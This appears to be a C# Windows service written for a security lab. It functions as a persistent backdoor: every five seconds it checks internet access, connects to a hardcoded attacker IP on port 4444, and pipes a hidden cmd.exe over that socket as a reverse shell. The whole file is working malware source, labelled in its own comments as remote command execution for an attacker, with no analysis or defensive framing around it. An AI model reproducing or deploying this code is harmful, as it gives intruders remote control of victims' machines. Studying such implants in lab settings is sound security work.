using System;
using System.IO;
using System.Net.Http;
using System.ServiceProcess;
using System.Timers;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net.Sockets;

namespace WindowsService1_lab2
{
    public partial class Service1 : ServiceBase
    {
        private Timer timer = new Timer();
        private readonly string checkUrl = "http://www.google.com"; // URL để kiểm tra kết nối
        private readonly string attackerIP = "10.0.2.130"; // Attacker IP
        private readonly int attackerPort = 4444; // Attacker port

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(CheckInternetAndShell);
            timer.Interval = 5000; // Kiểm tra mỗi 5 giây
            timer.Enabled = true;
        }

        protected override void OnStop()
        {
            WriteToFile("Service stopped at " + DateTime.Now);
        }

        //Depends on having internet connection or not does it run the reverse shell
        private async void CheckInternetAndShell(object source, ElapsedEventArgs e)
        {
            WriteToFile("Checking internet at " + DateTime.Now);
            if (await IsInternetAvailable())
            {
                WriteToFile("Internet is available at " + DateTime.Now);
                StartReverseShell(); // Bắt đầu reverse shell khi có internet
            }
            else
            {
                WriteToFile("No internet connection at " + DateTime.Now);
            }
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = path + "\\ServiceLog_" + DateTime.Now.ToString("yyyy-MM-dd") + ".txt";

            using (StreamWriter sw = new StreamWriter(filepath, true))
            {
                sw.WriteLine(Message);
            }
        }

        //Check internet connection
        private async Task<bool> IsInternetAvailable()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    HttpResponseMessage response = await client.GetAsync(checkUrl);
                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }

        private void StartReverseShell()
        {
            try
            {
                //TCP connection
                using (TcpClient client = new TcpClient(attackerIP, attackerPort))
                using (NetworkStream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
                {
                    writer.WriteLine("Connected to target");

                    Process process = new Process
                    {
                        //Call cmd for RCE
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "cmd.exe",
                            RedirectStandardInput = true,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }
                    };

                    //Takes in input and output to Attacker
                    process.OutputDataReceived += (sender, args) => { if (args.Data != null) writer.WriteLine(args.Data); };
                    process.ErrorDataReceived += (sender, args) => { if (args.Data != null) writer.WriteLine(args.Data); };

                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    string command;
                    while ((command = reader.ReadLine()) != null)
                    {
                        process.StandardInput.WriteLine(command);
                    }
                }
            }
            catch (Exception ex)
            {
                WriteToFile("Reverse shell error: " + ex.Message);
            }
        }
    }
}
